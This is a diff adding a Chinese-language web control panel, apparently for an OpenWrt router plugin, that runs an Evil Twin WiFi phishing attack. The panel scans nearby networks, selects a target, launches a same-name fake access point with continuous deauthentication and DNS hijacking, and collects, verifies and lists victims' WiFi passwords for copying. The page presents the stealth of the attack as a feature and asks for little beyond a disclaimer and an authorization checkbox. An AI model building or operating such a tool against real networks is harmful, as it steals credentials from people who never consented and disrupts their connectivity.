@@ -1,0 +1,339 @@
+<%+header%>
+<div class="arx-page-title-lg page-header page-hd ani animate-in">
+  <div class="page-title-row">
+    <h1><svg class="arx-icon" style="width:28px;height:28px;color:var(--danger);" aria-hidden="true"><use href="#i-alert-triangle"/></svg> Evil Twin 钓鱼 AP</h1>
+    <span class="page-subtitle page-sub">伪造同名开放 AP，持续 deauth 目标，捕获受害者输入的 WiFi 密码。仅限授权测试。</span>
+  </div>
+</div>
+
+<div class="et-warn-banner animate-in">
+  <div class="et-warn-icon" aria-hidden="true"><svg class="arx-icon"><use href="#i-antenna"/></svg></div>
+  <div class="et-warn-text">
+    <strong>工作流程：</strong>扫描选定目标 AP → 启动同名开放假 AP + 持续 deauth → 客户端连入后 DNS 全劫持弹出认证页 → 捕获输入的密码。
+    密码输入正确时自动停止 deauth，用户可重连真实 AP，不易察觉。
+    <div class="arx-callout arx-callout--danger" style="margin-top:12px;">本工具仅供授权渗透测试使用，未经授权使用可能违法。</div>
+  </div>
+</div>
+
+<!-- 目标配置 + 状态 -->
+<div class="et-cfg-grid">
+  <div class="cbi-section animate-in">
+    <h3 class="arx-kicker" style="margin-bottom:14px">目标 AP 配置</h3>
+    <div class="et-field">
+      <label>SSID（WiFi 名称）</label>
+      <input type="text" id="et-ssid" class="et-input" placeholder="从下方扫描结果选择" maxlength="32" readonly>
+    </div>
+    <div class="et-field">
+      <label>BSSID（MAC 地址）</label>
+      <input type="text" id="et-bssid" class="et-input" placeholder="XX:XX:XX:XX:XX:XX" maxlength="17" readonly>
+    </div>
+    <div class="et-field">
+      <label>信道</label>
+      <input type="number" id="et-channel" class="et-input" value="6" min="1" max="196" style="max-width:100px">
+    </div>
+    <div class="et-field">
+      <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-weight:400">
+        <input type="checkbox" id="et-use-hash" style="margin-top:3px;flex-shrink:0">
+        <span>使用「握手抓包」页的 <code>capture.22000</code> 做密码校验（存在时推荐开启）</span>
+      </label>
+    </div>
+    <div class="et-field">
+      <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-weight:400;color:var(--danger)">
+        <input type="checkbox" id="et-auth-ack" style="margin-top:3px;flex-shrink:0">
+        <span>本人确认在<strong>书面授权</strong>范围内测试，或仅对<strong>自有/实验室网络</strong>做安全验证</span>
+      </label>
+    </div>
+  </div>
+
+  <div id="et-status-panel" class="et-status-panel animate-in">
+    <h3 class="arx-kicker" style="margin-bottom:12px">运行状态</h3>
+    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
+      <span class="badge badge-primary" id="et-badge">⏸ 未启动</span>
+      <span style="font-size:13px;color:var(--text-muted)" id="et-status-text">选择目标后启动</span>
+    </div>
+    <div id="et-latest-cred" class="et-latest-cred" style="display:none">
+      <div style="font-size:11px;color:#ef4444;font-weight:600;margin-bottom:4px">🔑 最新捕获</div>
+      <div id="et-latest-pw" style="font-family:ui-monospace,monospace;font-size:15px;font-weight:700;color:var(--text-primary)"></div>
+      <div id="et-latest-time" style="font-size:11px;color:var(--text-muted);margin-top:2px"></div>
+      <div id="et-latest-st" style="font-size:11px;color:var(--text-muted);margin-top:4px"></div>
+    </div>
+    <div id="et-extra-status" class="et-extra-status" style="display:none"></div>
+  </div>
+</div>
+
+<!-- 操作按钮 -->
+<div class="et-action-bar">
+  <button type="button" id="et-btn-scan" onclick="etScan()" class="cbi-button cbi-button-apply">🔍 扫描 WiFi</button>
+  <button type="button" id="et-btn-start" onclick="etStart()" class="cbi-button" style="display:none;background:linear-gradient(135deg,#ef4444,#dc2626)!important;color:#fff!important;border:none!important;box-shadow:0 2px 8px rgba(239,68,68,.3)!important">🎣 启动 Evil Twin</button>
+  <button type="button" id="et-btn-stop" onclick="etStop()" class="cbi-button cbi-button-reset" style="display:none">⏹ 停止</button>
+  <button type="button" id="et-btn-clear" onclick="etClearCreds()" class="cbi-button cbi-button-negative" style="display:none">🗑 清除凭据</button>
+</div>
+
+<!-- WiFi 扫描列表 -->
+<div class="cbi-section" id="et-wifi-section" style="display:none">
+  <div class="et-panel-head">
+    <h2>周围 WiFi</h2>
+    <span style="font-size:12px;color:var(--text-muted)">点击目标网络自动填入上方配置</span>
+  </div>
+  <div id="et-wifi-list" class="et-wifi-stack"></div>
+</div>
+
+<!-- 捕获的凭据 -->
+<div class="cbi-section">
+  <div class="et-panel-head">
+    <h2>捕获的密码</h2>
+    <button type="button" onclick="etLoadCreds()" class="cbi-button" style="padding:6px 14px;font-size:12px">🔄 刷新</button>
+  </div>
+  <div id="et-creds-list"><p class="et-empty">暂无捕获记录</p></div>
+</div>
+
+<!-- 日志 -->
+<div class="cbi-section" id="et-log-section" style="display:none">
+  <div class="et-panel-head"><h2>运行日志</h2></div>
+  <pre id="et-log-content" class="et-log-pre"></pre>
+</div>
+
+<script>
+(function() {
+  var pollTimer = null;
+  var isRunning = false;
+  var hashPrefInited = false;
+  var prevCredCount = -1;
+
+  function copyToClipboard(pw) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(pw)
+        .then(function() { showToast('已复制: ' + pw); })
+        .catch(function() { copyFallback(pw); });
+      return;
+    }
+    copyFallback(pw);
+  }
+  function copyFallback(pw) {
+    var ta = document.createElement('textarea');
+    ta.value = pw; ta.style.cssText = 'position:fixed;left:-9999px';
+    document.body.appendChild(ta); ta.select();
+    try { if (document.execCommand('copy')) showToast('已复制: ' + pw); else window.prompt('请手动复制:', pw); }
+    catch(e) { window.prompt('请手动复制:', pw); }
+    document.body.removeChild(ta);
+  }
+
+  // ---- 扫描 ----
+  window.etScan = function() {
+    var btn = document.getElementById('et-btn-scan');
+    btn.disabled = true; btn.textContent = '🔄 扫描中...';
+    document.getElementById('et-wifi-section').style.display = 'none';
+    fetch('<%=url("admin/arx-wificrack/scan")%>?_=' + Date.now())
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        btn.disabled = false; btn.textContent = '🔍 扫描 WiFi';
+        if (d.error) { alert(d.error); return; }
+        renderWifi(d.networks || []);
+      })
+      .catch(function(e) { btn.disabled = false; btn.textContent = '🔍 扫描 WiFi'; alert('扫描失败: ' + e.message); });
+  };
+
+  function sigColor(s) { return s > -60 ? '#22c55e' : s > -75 ? '#f59e0b' : '#ef4444'; }
+  function sigBars(s)  { return s > -60 ? '▂▄▆█' : s > -75 ? '▂▄▆_' : '▂▄__'; }
+
+  function renderWifi(networks) {
+    var sec = document.getElementById('et-wifi-section');
+    var list = document.getElementById('et-wifi-list');
+    if (!networks.length) {
+      list.innerHTML = '<p class="et-empty">未发现周围 WiFi</p>';
+      sec.style.display = ''; return;
+    }
+    list.innerHTML = networks.map(function(n) {
+      var sig = n.signal || 0;
+      var sc = sigColor(sig);
+      var sb = sigBars(sig);
+      var band = n.band === '5' ? '5 GHz' : '2.4 GHz';
+      var secBadge = (n.security === 'WPA2' || n.security === 'WPA')
+        ? '<span class="badge badge-success" style="font-size:11px">' + n.security + '</span>' : '';
+      return '<div class="et-wifi-row" style="--et-sig:' + sc + '">'
+        + '<div style="display:flex;align-items:center;gap:14px;min-width:0">'
+        + '<span style="font-family:monospace;font-size:18px;color:' + sc + ';letter-spacing:1px">' + sb + '</span>'
+        + '<div><div style="font-weight:600;font-size:14px">' + (n.ssid || '&lt;隐藏网络&gt;') + ' ' + secBadge + '</div>'
+        + '<div style="font-size:12px;color:var(--text-muted);margin-top:2px">' + (n.bssid || '') + ' · ' + band + ' · 信道 ' + (n.channel || '?') + ' · ' + sig + ' dBm</div></div>'
+        + '</div>'
+        + '<button type="button" class="cbi-button" style="padding:6px 14px;font-size:12px;background:linear-gradient(135deg,#ef4444,#dc2626)!important;color:#fff!important;border:none!important" onclick="etSelectTarget(\'' + (n.bssid||'').replace(/'/g,"\\'") + '\',\'' + (n.ssid||'').replace(/'/g,"\\'") + '\',' + (n.channel||6) + ',\'' + (n.band||'2.4') + '\')">🎯 选择目标</button>'
+        + '</div>';
+    }).join('');
+    sec.style.display = '';
+  }
+
+  window.etSelectTarget = function(bssid, ssid, channel, band) {
+    document.getElementById('et-ssid').value = ssid;
+    document.getElementById('et-bssid').value = bssid;
+    document.getElementById('et-channel').value = channel || 6;
+    document.getElementById('et-btn-start').style.display = '';
+    document.getElementById('et-wifi-section').style.display = 'none';
+    var msg = '已选择目标: ' + ssid;
+    if (band === '5') msg += '（5 GHz：请确认路由器射频与信道匹配 hostapd）';
+    showToast(msg);
+  };
+
+  // ---- 启动 / 停止 ----
+  window.etStart = function() {
+    var ssid = document.getElementById('et-ssid').value.trim();
+    var bssid = document.getElementById('et-bssid').value.trim();
+    var channel = document.getElementById('et-channel').value;
+    if (!ssid || !bssid) { alert('请先选择目标 AP'); return; }
+    if (!document.getElementById('et-auth-ack').checked) { alert('请勾选授权确认'); return; }
+    if (!confirm('确定对 "' + ssid + '" 启动 Evil Twin 攻击？\n\n本机 WiFi 将短暂中断，仅限授权测试使用。')) return;
+    var fd = new FormData();
+    fd.append('ssid', ssid); fd.append('bssid', bssid); fd.append('channel', channel);
+    fd.append('auth_ack', '1');
+    fd.append('use_capture_hash', document.getElementById('et-use-hash').checked ? '1' : '0');
+    fetch('<%=url("admin/arx-wificrack/et_start")%>', { method: 'POST', body: fd })
+      .then(function(r) { return r.json().catch(function() { return {}; }); })
+      .then(function(d) {
+        if (d.error) { alert(d.error); return; }
+        showToast(d.message || '已提交');
+        if (!pollTimer) pollTimer = setInterval(refreshStatus, 3000);
+        refreshStatus();
+      })
+      .catch(function(e) { alert('启动失败: ' + (e && e.message ? e.message : String(e))); });
+  };
+
+  window.etStop = function() {
+    fetch('<%=url("admin/arx-wificrack/et_stop")%>', { method: 'POST' })
+      .then(function(r) { return r.json().catch(function() { return {}; }); })
+      .then(function(d) {
+        stopPoll(); refreshStatus(); etLoadCreds();
+        showToast(d.message || '已停止');
+      })
+      .catch(function(e) { alert('停止失败: ' + (e && e.message ? e.message : String(e))); });
+  };
+
+  window.etClearCreds = function() {
+    if (!confirm('确定清除所有捕获的密码记录？')) return;
+    fetch('<%=url("admin/arx-wificrack/et_creds_rm")%>', { method: 'POST' })
+      .then(function(r) { return r.json().catch(function() { return {}; }); })
+      .then(function(d) { if (d.error) alert(d.error); etLoadCreds(); })
+      .catch(function(e) { alert('清除失败: ' + e.message); });
+  };
+
+  // ---- 状态轮询 ----
+  function refreshStatus() {
+    fetch('<%=url("admin/arx-wificrack/et_status")%>?_=' + Date.now())
+      .then(function(r) { return r.json(); })
+      .then(function(d) { updateUI(d); })
+      .catch(function() {});
+  }
+
+  function updateUI(d) {
+    isRunning = d.running;
+    var badge = document.getElementById('et-badge');
+    var text  = document.getElementById('et-status-text');
+    var panel = document.getElementById('et-status-panel');
+
+    var uh = document.getElementById('et-use-hash');
+    if (d.capture_hash_available) {
+      uh.disabled = false;
+      if (!hashPrefInited) { uh.checked = true; hashPrefInited = true; }
+    } else {
+      uh.checked = false; uh.disabled = true; hashPrefInited = false;
+    }
+
+    var extra = document.getElementById('et-extra-status');
+    if (d.running && (d.submit_state === 'verified' || d.submit_state === 'unverified_ok')) {
+      extra.style.display = 'block';
+      extra.textContent = d.submit_state === 'verified'
+        ? '✓ 密码已通过 handshake 校验；deauth 已停止，约 2 秒后自动停止 Evil Twin。若状态未刷新，可手动点「停止」。'
+        : '⚠ 已放行（无 .22000 时的二次提交模式），非密码学校验；约 2 秒后自动停止 Evil Twin。';
+    } else if (d.running) {
+      extra.style.display = 'block';
+      var ds = d.deauth_active ? 'deauth 进行中' : 'deauth 已停止';
+      var hs = d.has_handshake ? '已加载校验用 .22000' : '未加载 .22000（演示模式）';
+      extra.textContent = ds + ' · ' + hs;
+    } else {
+      extra.style.display = 'none';
+    }
+
+    if (d.running) {
+      badge.className = 'badge badge-danger';
+      badge.style.cssText = 'background:#ef4444;color:#fff';
+      badge.textContent = '🔴 运行中';
+      text.textContent = '正在钓鱼，等待受害者连接...';
+      panel.classList.add('is-running');
+    } else {
+      badge.className = 'badge badge-primary';
+      badge.style.cssText = '';
+      badge.textContent = '⏸ ' + (d.status || '未启动');
+      text.textContent = d.cred_count > 0 ? ('已捕获 ' + d.cred_count + ' 条密码') : '未运行';
+      panel.classList.remove('is-running');
+    }
+
+    if (d.latest) {
+      document.getElementById('et-latest-pw').textContent = d.latest.password;
+      document.getElementById('et-latest-time').textContent = d.latest.time;
+      var stMap = { verified: '✓ 已校验', unverified_ok: '⚠ 未校验(已放行)', pending: '…', rejected: '✗ 未通过', legacy: '—' };
+      document.getElementById('et-latest-st').textContent = '状态: ' + (stMap[d.latest.status || 'legacy'] || d.latest.status);
+      document.getElementById('et-latest-cred').style.display = 'block';
+      document.getElementById('et-btn-clear').style.display = '';
+    }
+
+    document.getElementById('et-btn-scan').style.display  = d.running ? 'none' : '';
+    document.getElementById('et-btn-start').style.display = d.running ? 'none' : (document.getElementById('et-bssid').value ? '' : 'none');
+    document.getElementById('et-btn-stop').style.display  = d.running ? '' : 'none';
+
+    if (d.log && d.log.trim()) {
+      document.getElementById('et-log-section').style.display = 'block';
+      var logEl = document.getElementById('et-log-content');
+      logEl.textContent = d.log; logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    var cc = typeof d.cred_count === 'number' ? d.cred_count : 0;
+    if (cc !== prevCredCount) { prevCredCount = cc; etLoadCreds(); }
+
+    if (d.running) { if (!pollTimer) pollTimer = setInterval(refreshStatus, 3000); }
+    else { stopPoll(); }
+  }
+
+  function stopPoll() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
+
+  // ---- 凭据列表 ----
+  window.etLoadCreds = function() {
+    fetch('<%=url("admin/arx-wificrack/et_creds")%>?_=' + Date.now())
+      .then(function(r) { return r.json().catch(function() { return {}; }); })
+      .then(function(d) { renderCreds((d && d.creds) || []); })
+      .catch(function() {});
+  };
+
+  function renderCreds(creds) {
+    var el = document.getElementById('et-creds-list');
+    if (!creds.length) {
+      el.innerHTML = '<p class="et-empty">暂无捕获记录</p>'; return;
+    }
+    var sorted = creds.slice().reverse();
+    el.innerHTML = sorted.map(function(c, i) {
+      var st = c.status || 'legacy';
+      var stLabel = { verified: '已校验', unverified_ok: '未校验放行', rejected: '拒绝', pending: '待处理', legacy: '—' };
+      var stCls = st === 'verified' ? 'badge-success' : st === 'unverified_ok' ? 'badge-warning' : 'badge-primary';
+      return '<div class="et-cred-row">'
+        + '<div><div style="font-family:ui-monospace,monospace;font-size:15px;font-weight:700;color:var(--text-primary)">' + c.password + '</div>'
+        + '<div style="font-size:11px;color:var(--text-muted);margin-top:2px">' + (c.time || '') + '</div></div>'
+        + '<div style="display:flex;gap:8px;align-items:center">'
+        + '<span class="badge ' + stCls + '" style="font-size:11px">' + (stLabel[st] || st) + '</span>'
+        + '<button type="button" class="cbi-button" style="padding:4px 10px;font-size:12px" onclick="(function(p){if(navigator.clipboard)navigator.clipboard.writeText(p);else{var t=document.createElement(\'textarea\');t.value=p;document.body.appendChild(t);t.select();document.execCommand(\'copy\');document.body.removeChild(t);}})(\'' + c.password.replace(/'/g,"\\'") + '\')">📋 复制</button>'
+        + '</div></div>';
+    }).join('');
+    document.getElementById('et-btn-clear').style.display = '';
+  }
+
+  function showToast(msg) {
+    var t = document.createElement('div');
+    t.textContent = msg;
+    t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:var(--bg-card);border:1px solid rgba(239,68,68,0.25);border-radius:var(--radius-md);padding:14px 20px;font-size:13px;z-index:9999;box-shadow:var(--shadow-lg);max-width:min(320px,92vw)';
+    document.body.appendChild(t);
+    setTimeout(function() { t.remove(); }, 3500);
+  }
+
+  window.addEventListener('beforeunload', function() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } });
+
+  refreshStatus();
+  etLoadCreds();
+})();
+</script>
+<%+footer%>
